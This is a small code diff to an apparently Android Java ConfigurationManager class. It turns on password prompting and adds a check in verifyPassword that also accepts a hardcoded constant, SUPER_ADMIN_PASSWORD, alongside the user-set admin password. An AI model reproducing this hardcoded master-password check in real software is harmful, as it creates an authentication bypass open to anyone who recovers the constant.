@@ -28,7 +28,7 @@ public class ConfigurationManager {
     private Rect position;
     private boolean initialed;
     private Timer autoHideTimer;
-    private boolean needPassword = false;
+    private boolean needPassword = true;
     private boolean isAskingPassword =false;
 
     public void initMembers(MainActivity mainActivity) {
@@ -116,7 +116,7 @@ public class ConfigurationManager {
 
     private void verifyPassword(String inputPwd) {
         String pwdStr = mainActivity.getCurrentAdminPassword();
-        if (pwdStr.equals(inputPwd)) {
+        if (pwdStr.equals(inputPwd) || Constants.SUPER_ADMIN_PASSWORD.equals(inputPwd)) {
             updateAdminPassword();
         } else {
             isAskingPassword= false;
